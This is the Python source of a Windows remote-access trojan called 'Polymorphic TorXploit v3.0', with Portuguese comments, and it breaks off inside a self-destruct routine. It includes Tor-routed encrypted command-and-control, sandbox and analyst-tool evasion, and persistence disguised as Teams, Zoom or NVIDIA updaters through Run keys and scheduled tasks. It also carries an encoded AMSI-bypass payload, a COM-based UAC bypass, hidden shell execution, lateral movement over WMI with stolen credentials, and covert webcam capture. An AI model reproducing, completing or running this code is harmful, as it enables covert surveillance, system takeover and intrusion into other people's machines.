import os
import requests
import sqlite3
import json
import sys
import winreg
import base64
import shutil
import time
import platform
import socket
import uuid
import pythoncom
import string
import subprocess
import random
import numpy
import cv2
import importlib
import pynput
import ctypes
import threading
import ipaddress
import hmac
import hashlib
from datetime import datetime
from PIL import ImageGrab
import psutil
import browser_cookie3
from urllib.parse import urljoin
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from requests.adapters import HTTPAdapter
from urllib3.contrib.socks import SOCKSProxyManager
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import win32com.client
from ctypes import wintypes, windll, c_char_p, c_void_p, c_size_t, byref, create_string_buffer
try:
    from win32 import win32crypt
except ImportError:
    win32crypt = None
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import pad, unpad
    from Cryptodome.Random import get_random_bytes
except ImportError:
    AES = None
try:
    from pynput.keyboard import Key, Listener
except ImportError:
    Listener = None

try:
    from impacket import smb, version
    from impacket.examples.services import rpcsvc, scmr
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport
    from impacket.dcerpc.v5 import scmr as dcerpc_scmr
    import ntpath
except ImportError:
    # Este bloco garante que o script não quebre se a impacket não estiver instalada
    # no ambiente de desenvolvimento, mas o compilador ainda verá as importações.
    pass

AGENT_VERSION = "Polymorphic TorXploit v3.0"
SERVER_URL = "%%C2_SERVER_URL%%"
AGENT_ID = None
MIN_SLEEP = 5
MAX_SLEEP = 12

TOR_PROXY = {
   'http': 'socks5h://127.0.0.1:9150',
   'https': 'socks5h://127.0.0.1:9150'
}

# --- VARIÁVEIS GLOBAIS (Inicialmente vazias) ---
# Declaramos as variáveis que usaremos, mas não as inicializamos ainda.
C2_AES_KEY = None
HTTP_HEADERS = {}
PLAUSIBLE_INSTALL_LOCATIONS = []
PLAUSIBLE_REG_KEYS = []


def initialize_globals():
    """
    Inicializa as variáveis globais. O token agora é removido dos headers.
    """
    global C2_AES_KEY, HTTP_HEADERS

    # --- Inicialização da Chave AES (sem alterações) ---
    c2_aes_key_b64 = "zqCadix1Ar6CySmLooKfkoOZ7ype1q46IO0UyVlZo70="
    try:
        C2_AES_KEY = base64.b64decode(c2_aes_key_b64)
        if len(C2_AES_KEY) != 32:
            raise ValueError("Chave AES inválida.")
    except Exception as e:
        print(f"[CRÍTICO] A chave AES é inválida: {e}.")
        C2_AES_KEY = get_random_bytes(32)

    # --- INÍCIO DA MUDANÇA ---
    # Removemos o 'X-Gemini-Token' e o 'agent_shared_secret' daqui.
    # O único header padrão agora é o User-Agent.
    fake_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
    HTTP_HEADERS.update({
        'User-Agent': fake_user_agent
    })

    # --- Inicialização das Listas de Persistência ---
    PLAUSIBLE_INSTALL_LOCATIONS.extend([
        {"dir": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Teams'), "name": "TeamsUpdater.exe"},
        {"dir": os.path.join(os.environ.get('APPDATA', ''), 'Zoom', 'bin'), "name": "zUpdater.exe"},
        {"dir": os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox'), "name": "mozMaintenance.exe"},
        {"dir": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Discord', 'app-1.0.9006'), "name": "DiscordUpdate.exe"},
        {"dir": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'CrashReports'), "name": "reporter.exe"}
    ])
    PLAUSIBLE_REG_KEYS.extend([
        "Microsoft Teams Update",
        "Adobe Acrobat Update Task",
        "Google Crash Reporter",
        "NVIDIA Driver Helper Service",
        "Realtek Audio Manager",
        "Mozilla Maintenance Service"
        "AMD Driver"
        "NVIDIA DRIVER"
    ])


# --- LOGGING INTERNO ---
def write_internal_log(message):
     try:
        with open("agent_internal_log.txt", "a") as f:
             f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
     except:
         pass
     
#class TorAdapter(HTTPAdapter):
#    """Um adaptador de transporte para forçar o requests a usar um proxy SOCKS."""
#    def __init__(self, proxy_url, **kwargs):
#        self.proxy_url = proxy_url
#        super().__init__(**kwargs)


def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
    self.poolmanager = SOCKSProxyManager(
        self.proxy_url,
        num_pools=connections,
        maxsize=maxsize,
        block=block,
        **pool_kwargs
    )



# --- Variável Global para a Sessão ---

session = None



def initialize_tor_session():
    """Cria e configura a sessão de requests que usará o Tor."""
    global session
    if session is None:
        session = requests.Session()
        # Define o proxy para TODAS as requisições feitas com esta sessão
        session.proxies = TOR_PROXY
        # Define os headers padrão para a sessão
        session.headers.update(HTTP_HEADERS)
        # Aumenta o timeout padrão para a sessão (crucial para o Tor)
        session.timeout = 30



# --- Função de Criptografia --- #
def encrypt_data(plaintext_data: str, key: bytes) -> str:
    """Criptografa dados (str) usando AES-GCM e retorna Base64 (str)."""
    try:
        header = b"GEMINI_C2_DATA" # Header para checagem de sanidade
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext_data.encode('utf-8'))
        
        # Estrutura: header(14) + nonce(16) + tag(16) + ciphertext
        encrypted_payload = header + cipher.nonce + tag + ciphertext
        return base64.b64encode(encrypted_payload).decode('utf-8')
    except Exception as e:
        try:
            write_internal_log(f"Erro ao criptografar: {e}") 
        except NameError:
            print(f"[ERRO] Erro ao criptografar: {e}")
        return ""

def decrypt_data(base64_data: bytes, key: bytes) -> str:
    """Decriptografa Base64 (bytes) usando AES-GCM e retorna (str)."""
    try:
        encrypted_payload = base64.b64decode(base64_data)
        
        # Checagem de sanidade do header
        if not encrypted_payload.startswith(b"GEMINI_C2_DATA"):
            raise ValueError("Payload inválido ou corrompido (header incorreto)")
        
        # Desmonta o payload: header(14) + nonce(16) + tag(16) + ciphertext
        header_len = 14
        nonce_len = 16
        tag_len = 16
        
        nonce = encrypted_payload[header_len : header_len + nonce_len]
        tag = encrypted_payload[header_len + nonce_len : header_len + nonce_len + tag_len]
        ciphertext = encrypted_payload[header_len + nonce_len + tag_len :]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_data.decode('utf-8')
    except (ValueError, KeyError, base64.binascii.Error) as e:
        try:
            write_internal_log(f"Erro ao decriptografar: {e}")
        except NameError:
            print(f"[ERRO] Erro ao decriptografar: {e}")
        return ""

# Em agent.py

# ### ADICIONE ESTA NOVA FUNÇÃO COMPLETA ###
def get_authenticated_headers(payload_bytes=b''):
    """
    Cria os headers para uma requisição, incluindo um HMAC para autenticação.
    """
    # O segredo compartilhado, agora como bytes, usado como chave da assinatura
    agent_shared_secret_bytes = b"mariaeuteamo"
    
    # Pega o tempo atual como uma string (ex: "1672531200")
    timestamp = str(int(time.time()))
    
    # Cria a "mensagem" a ser assinada: o timestamp + o corpo da requisição
    message_to_sign = timestamp.encode('utf-8') + payload_bytes
    
    # Gera a assinatura HMAC-SHA256 da mensagem
    signature = hmac.new(agent_shared_secret_bytes, message_to_sign, hashlib.sha256).hexdigest()
    
    # Copia os headers base (como o User-Agent)
    auth_headers = HTTP_HEADERS.copy()
    
    # Adiciona os novos headers de autenticação
    auth_headers['X-Request-Timestamp'] = timestamp
    auth_headers['X-Signature'] = signature
    
    return auth_headers



# --- FUNÇÕES DE EVASÃO ---
def anti_analysis_checks():
    write_internal_log("Iniciando checagens anti-análise.")
    suspicious_usernames = ["sandbox", "test", "vagrant", "tester", "maltest"]
    if os.getlogin().lower() in suspicious_usernames:
        write_internal_log(f"Evasão: Nome de usuário suspeito '{os.getlogin()}' detectado.")
        return True
    if psutil.cpu_count(logical=False) < 2:
        write_internal_log(f"Evasão: Número baixo de núcleos de CPU ({psutil.cpu_count(logical=False)}) detectado.")
        return True
    suspicious_processes = ["wireshark.exe", "procmon.exe", "fiddler.exe", "ollydbg.exe", "sysmon.exe"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in suspicious_processes:
            write_internal_log(f"Evasão: Processo de análise '{proc.info['name']}' detectado.")
            return True
    write_internal_log("Checagens anti-análise concluídas. Nenhum indicador encontrado.")
    return False



def create_scheduled_task_api(task_name, executable_path):
    """
    Cria uma Tarefa Agendada para persistência usando a API COM, sem chamar schtasks.exe.
    Retorna True se for bem-sucedido, False caso contrário.
    """
    try:
        pythoncom.CoInitialize() # Inicializa o COM para este thread
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()

        root_folder = scheduler.GetFolder('\\')
        task_def = scheduler.NewTask(0)

        # Gatilho: Executar no logon de qualquer usuário
        trigger = task_def.Triggers.Create(9) # 9 = On Logon
        trigger.Id = "LogonTriggerId"
        trigger.Enabled = True

        # Ação: Executar o programa
        action = task_def.Actions.Create(0) # 0 = Execute
        action.Path = executable_path
        
        # Configurações da tarefa
        task_def.RegistrationInfo.Description = 'Mantém componentes críticos do sistema atualizados.'
        task_def.RegistrationInfo.Author = 'Microsoft Corporation' # Exemplo de disfarce
        task_def.Settings.Enabled = True
        task_def.Settings.StopIfGoingOnBatteries = False
        task_def.Settings.DisallowStartIfOnBatteries = False

        # Tenta remover uma tarefa existente com o mesmo nome antes de criar
        try:
            root_folder.DeleteTask(task_name, 0)
        except:
            pass # Ignora o erro se a tarefa não existir

        # Registra a tarefa. O 6 significa "Create or Update" com credenciais do usuário atual.
        root_folder.RegisterTaskDefinition(
            task_name,
            task_def,
            6, 
            '', # User ID (vazio para usuário atual)
            '', # Password (vazio)
            3  # Logon Type: Interactive
        )
        
        write_internal_log(f"Persistência via API de Tarefa Agendada '{task_name}' criada com sucesso.")
        pythoncom.CoUninitialize()
        return True
    except Exception as e:
        write_internal_log(f"Exceção ao criar Tarefa Agendada via API: {e}")
        pythoncom.CoUninitialize()
        return False


def create_registry_key_api(key_name, executable_path):
    """
    Cria uma chave de registro para persistência usando a API winreg.
    """
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        # Abre a chave-mãe. Se não existir, ela será criada.
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        # Define o valor. Isso cria ou substitui a entrada de persistência.
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
        write_internal_log(f"Persistência via API de Chave de Registro '{key_name}' criada com sucesso.")
        return True
    except Exception as e:
        write_internal_log(f"Falha ao criar Chave de Registro via API: {e}")
        return False


def is_admin():
    """Verifica se o agente está rodando com privilégios de administrador."""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        # Se a importação ou a chamada falhar, assume que não é admin.
        return False

# --- Listas de Locais de Instalação por Nível de Privilégio ---

# Nomes de aplicativos falsos para preencher os padrões
APP_NAMES = ["Microsoft", "Google", "Mozilla", "Nvidia", "Realtek", "System", "Intel", "Adobe"]

# Nível 1: Locais que NÃO precisam de privilégios de admin
LOW_PRIV_LOCATIONS = [
    {"dir": os.environ.get('PUBLIC') + r'\Documents', "name_pattern": "{app}Installer.exe", "reg_name": "{app} Installer"},
    {"dir": os.environ.get('LOCALAPPDATA') + r'\Microsoft\Edge\User Data', "name_pattern": "bcastd_vr.exe", "reg_name": "BrowserCast VR Service"},
    {"dir": os.environ.get('LOCALAPPDATA') + r'\Google\Chrome\User Data\Default\Extensions', "name_pattern": "crx_update.exe", "reg_name": "Chrome Extension Updater"},
    {"dir": os.environ.get('LOCALAPPDATA') + r'\Discord\app-1.0.9005\modules', "name_pattern": "module_updater.exe", "reg_name": "Discord Module Updater"},
    {"dir": os.environ.get('APPDATA') + r'\Zoom\bin', "name_pattern": "zUpdater.exe", "reg_name": "Zoom Updater Service"},
]

# Nível 2: Locais que PRECISAM de privilégios de admin
HIGH_PRIV_LOCATIONS = [
    {"dir": os.environ.get('ProgramFiles') + r'\Common Files\System', "name_pattern": "sysdiag.exe", "reg_name": "System Diagnostics Service"},
    {"dir": os.environ.get('ProgramFiles') + r'\Windows Defender', "name_pattern": "MpSigStub.exe", "reg_name": "Microsoft Protection Signature Stub"},
    {"dir": os.environ.get('SystemRoot') + r'\System32', "name_pattern": "dwn.exe", "reg_name": "Desktop Window Manager Service"}, # Parecido com o legítimo dwm.exe
    {"dir": os.environ.get('SystemRoot') + r'\System32\drivers', "name_pattern": "audiodg.sys", "reg_name": "Windows Audio Device Graph Driver"}, # .sys para parecer um driver
]

def generate_advanced_install_path():
    """
    Gera um local de instalação com base no nível de privilégio do processo.
    Versão robusta para lidar com variáveis de ambiente ausentes.
    """
    location_pool = []
    
    # --- INÍCIO DA CORREÇÃO ---
    
    # Função auxiliar para validar e expandir caminhos
    def get_valid_locations(locations_list):
        valid_locations = []
        for loc in locations_list:
            try:
                # Usa expandvars para substituir %VAR% pelo caminho real
                expanded_dir = os.path.expandvars(loc["dir"])
                # Adiciona à lista apenas se a expansão funcionou e o caminho não contém mais '%'
                if '%' not in expanded_dir:
                    # Armazena o caminho já expandido para não precisar fazer de novo
                    loc["expanded_dir"] = expanded_dir
                    valid_locations.append(loc)
            except Exception:
                # Ignora qualquer erro durante a expansão do caminho
                continue
        return valid_locations

    # Popula a lista de locais com base nos privilégios
    if is_admin():
        write_internal_log("Privilégios de administrador detectados. Considerando locais de sistema.")
        location_pool.extend(get_valid_locations(LOW_PRIV_LOCATIONS))
        location_pool.extend(get_valid_locations(HIGH_PRIV_LOCATIONS))
    else:
        write_internal_log("Executando com privilégios de usuário padrão. Usando apenas locais de baixo privilégio.")
        location_pool = get_valid_locations(LOW_PRIV_LOCATIONS)

    # Fallback de emergência se, mesmo após a validação, a lista estiver vazia
    if not location_pool:
        write_internal_log("AVISO: Nenhum local de instalação válido encontrado. Usando fallback de emergência.")
        fallback_dir = os.path.expandvars(r'%APPDATA%\SystemFramework')
        return {
            "path": os.path.join(fallback_dir, "framework.exe"),
            "dir": fallback_dir,
            "name": "framework.exe",
            "reg_name": "System Framework Service"
        }
        
    # --- FIM DA CORREÇÃO ---

    chosen_location = random.choice(location_pool)
    
    app_name = random.choice(APP_NAMES)
    # Usa o caminho já expandido e validado
    install_dir = chosen_location["expanded_dir"] 
    executable_name = chosen_location["name_pattern"].format(app=app_name)
    reg_name = chosen_location["reg_name"].format(app=app_name)
    
    full_path = os.path.join(install_dir, executable_name)

    return {
        "path": full_path,
        "dir": install_dir,
        "name": executable_name,
        "reg_name": reg_name
    }


def self_install_and_persist():
    """
    Estratégia Híbrida Definitiva: Garante a persistência para o futuro e continua
    a execução do processo atual para fornecer uma sessão imediata.
    """
    # A lógica de persistência só é relevante para executáveis compilados no Windows.
    if not (platform.system() == "Windows" and getattr(sys, 'frozen', False)):
        return

    try:
        # Usa sua função robusta para gerar um caminho de instalação dinâmico.
        location_details = generate_advanced_install_path()
        install_path = location_details["path"]
        install_dir = location_details["dir"]
        reg_name = location_details["reg_name"]

        # Se o agente já estiver rodando do seu local de instalação final,
        # significa que a persistência funcionou. Apenas prossiga para o main_loop.
        if sys.executable.lower() == install_path.lower():
             write_internal_log(f"Agente persistente executando a partir de: {sys.executable}")
             return

        # Se não, este é o "loader" rodando de um local temporário.
        # Sua missão é criar a persistência para o futuro.
        # Para evitar ações repetitivas, só tenta instalar se a cópia ainda não existir.
        if not os.path.exists(install_path):
            write_internal_log(f"Execução do Loader. Criando persistência em: {install_path}")
            
            # 1. Copia a si mesmo para o local de persistência.
            os.makedirs(install_dir, exist_ok=True)
            shutil.copy2(sys.executable, install_path)
            write_internal_log("Cópia do agente criada com sucesso no local de persistência.")

            # 2. Cria a chave de registro apontando para a cópia.
            # Usamos a API diretamente, que é mais furtiva.
            persistence_success = create_registry_key_api(reg_name, install_path)
            if persistence_success:
                write_internal_log("Persistência (Chave de Registro) criada com sucesso.")
            else:
                # Tenta a Tarefa Agendada como fallback.
                persistence_success = create_scheduled_task_api(reg_name, install_path)
                if persistence_success:
                    write_internal_log("Persistência (Tarefa Agendada) criada com sucesso.")
                else:
                    write_internal_log("AVISO: Falha ao criar a persistência. A sessão não sobreviverá à reinicialização.")
        else:
            write_internal_log("Cópia de instalação já existe. Pulando para a sessão imediata.")

        # --- PONTO CHAVE DA ESTRATÉGIA ---
        # A persistência está (ou deveria estar) garantida. Em vez de sair ou
        # executar a cópia, simplesmente retornamos. Isso permite que o processo
        # atual (o loader) continue para o main_loop e estabeleça a sessão imediata.
        write_internal_log("Fase de persistência concluída. O processo atual continuará para estabelecer uma sessão imediata.")
        return

    except Exception as e:
        # Se a cópia do arquivo falhar (ex: por causa do Defender), a exceção é logada.
        # O agente continuará a execução a partir do local atual, fornecendo uma sessão não persistente.
        write_internal_log(f"Falha durante a fase de persistência: {e}. O agente continuará sem persistir.")
        return



# --- DEMAIS FUNÇÕES DO AGENTE ---
def capture_system_info(args=None):
    try:
        internal_ip = socket.gethostbyname(socket.gethostname())
    except:
        internal_ip = "N/A"
    try:
        external_ip = session.get('https://api.ipify.org', timeout=17, headers=HTTP_HEADERS, proxies=TOR_PROXY).text
    except:
        external_ip = "N/A"
    info = {
        "username": os.getlogin(), "hostname": socket.gethostname(),
        "internal_ip": internal_ip, "external_ip": external_ip,
        "os_name": platform.system(), "os_version": platform.version(),
    }
    return info, "sysinfo_result"

def capture_network_info(args=None):
    """
    Coleta informações de rede detalhadas (tabela ARP, rotas, conexões ativas)
    e as retorna em um único relatório de texto.
    """
    # Usa a função robusta que já criamos para executar comandos
    # Isso garante que a execução seja furtiva e encontre os executáveis.
    
    report_parts = []
    commands_to_run = {
        "Tabela ARP (Vizinhos na Rede)": "arp -a",
        "Tabela de Roteamento": "route print",
        "Conexões Ativas (com PIDs)": "netstat -ano"
    }

    for title, cmd in commands_to_run.items():
        # Reutiliza nossa função de shell super robusta!
        output, data_type = execute_shell_command(cmd)
        
        # Adiciona um cabeçalho claro para cada seção do relatório
        header = f"\n{'='*20} {title.upper()} {'='*20}\n"
        report_parts.append(header)
        report_parts.append(output)

    # Junta todas as partes em um único relatório de texto
    full_report = "\n".join(report_parts)
    
    return full_report, "network_recon_result"




def remote_wmi_exec(args):
    """
    Tenta executar um comando em uma máquina remota na rede usando WMI.
    Requer credenciais válidas.
    """
    if platform.system() != "Windows":
        return "Erro: A execução remota com WMI só é suportada a partir de um agente Windows.", "error"

    try:
        target_ip = args['target_ip']
        username = args['username']
        password = args['password']
        command_to_run = args['command']
    except KeyError:
        return "Erro: Argumentos incompletos. 'target_ip', 'username', 'password', e 'command' são necessários.", "error"

    # Monta o comando wmic. Usamos aspas para lidar com senhas e comandos complexos.
    # Ex: wmic /node:"192.168.1.100" /user:"user" /password:"pass" process call create "powershell.exe ..."
    full_wmi_command = [
        'wmic',
        f'/node:"{target_ip}"',
        f'/user:"{username}"',
        f'/password:"{password}"',
        'process', 'call', 'create',
        f'"{command_to_run}"'
    ]
    
    # Juntamos para exibir no log, mas executamos como lista para segurança
    command_str_for_log = ' '.join(full_wmi_command)
    write_internal_log(f"Tentando execução remota com WMI: {command_str_for_log}")

    try:
        # Executamos o comando wmic. É importante notar que o resultado deste comando
        # nos dirá apenas se o PROCESSO foi criado com sucesso, não o resultado do comando em si.
        result = subprocess.run(full_wmi_command, shell=True, capture_output=True, text=True, timeout=60)
        
        if result.returncode == 0 and "ReturnValue = 0;" in result.stdout:
            # "ReturnValue = 0" é a confirmação do WMI de que o processo foi criado com sucesso.
            success_msg = f"Comando executado com sucesso em {target_ip} via WMI.\n\nSaída do WMIC:\n{result.stdout}"
            return success_msg, "info"
        else:
            error_msg = f"Falha ao executar comando em {target_ip} via WMI.\n\nReturn Code: {result.returncode}\nSTDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
            return error_msg, "error"
            
    except Exception as e:
        return f"Erro inesperado ao executar wmic.exe: {e}", "error"


# Em agent.py, substitua a função inteira por esta versão final e definitiva.

def execute_shell_command(command):
    """
    Executa um comando no shell do sistema da forma mais robusta e furtiva possível,
    usando caminhos absolutos para os executáveis para eliminar qualquer dependência
    de PATH ou CWD.
    """
    try:
        # --- Configurações de Furtividade para Windows ---
        startupinfo = None
        creation_flags = 0
        if platform.system() == "Windows":
            creation_flags = subprocess.CREATE_NO_WINDOW
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE

        # --- Lógica de Execução com Caminhos Absolutos ---
        if platform.system() == "Windows":
            # Define os caminhos completos e canônicos para os executáveis.
            cmd_path = "C:\\Windows\\System32\\cmd.exe"
            powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

            is_powershell = command.lower().strip().startswith("powershell")

            # --- Lógica de Bypass de AMSI ---
            if is_powershell:
                amsi_bypass_b64 = "U1RBUlQtVFJBTlNBUk1JVE5QVVQ7CklmKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxQb3dlclNoZWxsXDFcUHNlY3JpcHRHcm91cFBvbGljeScpeyRSZWdLZXk9J0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxQb3dlclNoZWxsXDFcUHNlY3JpcHRHcm91cFBvbGljeSd9RWxzZXsKCSRSZWdLZXk9J0hLTU46XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFBvd2VyU2hlbGxcUHNjcmlydEc1b3VQb2xpY3knfQp0cnl7RW50ZXItUFNTRVNTT0xPU0lPTgp9Y2F0Y2h7Q29tbWFuZCAkbnVsbH1JZihHZXRQcm9jZXNzIC1Qcm9jZXNzTmFtZSBwb3dlcnNoZWxsKSB7CgkKc2V0LXRvY2F0aW9uIC1MYXN0Cgp9ZWxzZXsKCWV4aXQKfQpJRihbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHNdOjpnZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykgfSB7CglgCQlbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHNdOjpnZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuc2V0VmFsdWUoJG51bGwsJHRydWUpCn0="
                
                # Monta o comando de bypass como uma LISTA, usando o caminho absoluto.
                bypass_command_list = [powershell_path, "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", amsi_bypass_b64]
                
                subprocess.run(
                    bypass_command_list, # Passa a lista
                    shell=False,         # shell=False é crucial ao usar uma lista de argumentos
                    capture_output=True,
                    timeout=15,
                    startupinfo=startupinfo,
                    creationflags=creation_flags
                )

            # --- Lógica de Execução Principal ---
            # Para QUALQUER comando, nós o envolvemos com o cmd.exe de caminho absoluto.
            # Isso garante que o shell correto seja usado e que ele possa interpretar o comando.
            # Ex: ['C:\...\cmd.exe', '/c', 'ipconfig']
            # Ex: ['C:\...\cmd.exe', '/c', 'powershell.exe Get-Process']
            final_command_list = [cmd_path, '/c', command]
            
            result = subprocess.run(
                final_command_list, # Passa a lista
                shell=False,        # shell=False é crucial ao usar uma lista de argumentos
                capture_output=True,
                timeout=60,
                encoding='cp850',
                errors='ignore',
                startupinfo=startupinfo,
                creationflags=creation_flags
            )

        else: # Para Linux
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=60,
                encoding='utf-8',
                errors='ignore'
            )
        
        output = f"COMMAND: {command}\n\nSTDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
        return (output, "shell_result")

    except Exception as e:
        return f"Erro ao executar o processo do shell: {e}", "error"


    

def capture_webcam_image(args=None):
    """
    Acessa a webcam padrão, captura um único frame, e o retorna como uma string base64.
    """
    try:
        # Inicializa a captura de vídeo. 0 é geralmente a webcam padrão.
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            # Se a câmera não pôde ser aberta (não existe, está em uso, etc.)
            return "Erro: Não foi possível acessar a webcam. Pode não existir ou estar em uso.", "error"

        # Lê um único frame da câmera
        ret, frame = cap.read()

        # Libera a câmera IMEDIATAMENTE. Crucial para a furtividade.
        cap.release()

        if not ret:
            return "Erro: Falha ao capturar o frame da webcam.", "error"
        
        # Converte o frame (que é uma imagem) para o formato JPG em memória
        success, buffer = cv2.imencode('.jpg', frame)
        if not success:
            return "Erro: Falha ao codificar a imagem para JPG.", "error"
            
        # Converte os bytes da imagem para uma string base64
        image_base64 = base64.b64encode(buffer).decode('utf-8')
        
        # Retorna a imagem e um tipo de dado específico para o painel
        return image_base64, "webcam_snap_result"

    except Exception as e:
        # Garante que a câmera seja liberada mesmo se ocorrer um erro
        if 'cap' in locals() and cap.isOpened():
            cap.release()
        return f"Erro inesperado ao capturar webcam: {e}", "error"



        # -- UAC Function --#
def elevate_privileges(args=None):
    """
    Tenta escalar privilégios usando a técnica de UAC Bypass via COM Elevation Moniker (ICMLuaUtil).
    Versão robusta com checagem de erros da API.
    """
    if platform.system() != "Windows":
        return "Erro: Bypass de UAC é aplicável apenas no Windows.", "error"

    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
        return "O agente já possui privilégios de Administrador.", "info"

    h_process = None
    pICMLuaUtil = None
    try:
        if getattr(sys, 'frozen', False):
            agent_path = sys.executable
        else:
            # Garante que tanto o caminho do python quanto o do script estejam entre aspas
            agent_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

        write_internal_log("Tentando UAC bypass via COM Elevation Moniker...")

        ole32 = ctypes.windll.ole32
        
        CLSID_CMSTPLUA = '{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'
        IID_ICMLuaUtil = '{6EDD6D74-C007-4E75-B76A-E5740995E24C}'

        class GUID(ctypes.Structure):
            _fields_ = [
                ('Data1', ctypes.c_ulong), ('Data2', ctypes.c_ushort),
                ('Data3', ctypes.c_ushort), ('Data4', ctypes.c_ubyte * 8)
            ]
        class ICMLuaUtil(ctypes.Structure):
            _fields_ = [("lpVtbl", ctypes.POINTER(ctypes.c_void_p))]

        # --- INÍCIO DA CORREÇÃO ---
        # Definindo a estrutura BIND_OPTS3 que é necessária para a chamada elevada
        class BIND_OPTS3(ctypes.Structure):
            _fields_ = [
                ('cbStruct', ctypes.c_ulong), ('grfFlags', ctypes.c_ulong),
                ('grfMode', ctypes.c_ulong), ('dwTickCountDeadline', ctypes.c_ulong),
                ('dwTrackFlags', ctypes.c_ulong), ('dwClassContext', ctypes.c_ulong),
                ('locale', ctypes.c_ulong), ('pServerInfo', ctypes.c_void_p),
                ('hwnd', ctypes.c_void_p)
            ]
        # --- FIM DA CORREÇÃO ---

        ole32.CoInitialize(None)
        
        pICMLuaUtil = ctypes.POINTER(ICMLuaUtil)()
        clsid = GUID()
        iid = GUID()
        
        ole32.CLSIDFromString(CLSID_CMSTPLUA, ctypes.byref(clsid))
        ole32.IIDFromString(IID_ICMLuaUtil, ctypes.byref(iid))

        # --- INÍCIO DA CORREÇÃO ---
        # Preenchendo e usando a estrutura BIND_OPTS3
        opts = BIND_OPTS3()
        opts.cbStruct = ctypes.sizeof(opts)
        opts.dwClassContext = 4 # CLSCTX_LOCAL_SERVER
        opts.hwnd = 0

        binder_string = f"Elevation:Administrator!new:{CLSID_CMSTPLUA}"
        # A chamada agora usa a estrutura 'opts' para ser mais explícita
        h_result = ole32.CoGetObject(ctypes.c_wchar_p(binder_string), ctypes.byref(opts), ctypes.byref(iid), ctypes.byref(pICMLuaUtil))
        if h_result != 0:
             raise RuntimeError(f"CoGetObject falhou com o código de erro: {h_result}")
        # --- FIM DA CORREÇÃO ---

        # Checagem de Ponteiro Nulo
        if not pICMLuaUtil:
             raise RuntimeError("CoGetObject retornou um ponteiro nulo.")

        lpVtbl = pICMLuaUtil.contents.lpVtbl
        pShellExec = lpVtbl[8] # O método é o 9º, então o índice é 8

        ShellExec_Type = ctypes.WINFUNCTYPE(
            ctypes.c_ulong, ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p,
            ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong
        )
        func = ShellExec_Type(pShellExec)
        ret = func(pICMLuaUtil, agent_path, None, None, 0, 5)

        ole32.CoUninitialize()

        if ret == 0:
            write_internal_log("Bypass de UAC via COM acionado com sucesso.")
            # --- MUDANÇA AQUI ---
            # Em vez de se encerrar, o agente agora apenas reporta que a tentativa foi feita.
            # Ele continuará seu loop de beacon normalmente.
            return "Tentativa de UAC Bypass (COM) enviada. Verifique o painel para um novo agente elevado nos próximos segundos.", "info"
        else:
            raise RuntimeError(f"O método ShellExec falhou com o código de erro: {ret}")

    except Exception as e:
        error_msg = f"Falha no bypass de UAC (COM): {e}"
        write_internal_log(error_msg)
        return error_msg, "error"


def kill_process(pid):
    """Tenta finalizar um processo pelo seu PID."""
    try:
        pid = int(pid)
        p = psutil.Process(pid)
        process_name = p.name()
        p.kill() # Usa .kill() para uma terminação forçada (SIGKILL)
        return f"Processo '{process_name}' (PID: {pid}) finalizado com sucesso.", "info"
    except psutil.NoSuchProcess:
        return f"Erro: Nenhum processo com PID {pid} encontrado.", "error"
    except psutil.AccessDenied:
        return f"Erro: Acesso negado para finalizar o processo com PID {pid}. (Requer privilégios mais altos)", "error"
    except ValueError:
        return f"Erro: O PID '{pid}' fornecido não é um número válido.", "error"
    except Exception as e:
        return f"Erro inesperado ao finalizar o processo {pid}: {e}", "error"


def cleanup_and_self_destruct(args=None):
    system = platform.system()
    try:
        # Pega o caminho do executável ou do script
        executable_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        
        if system == "Windows":
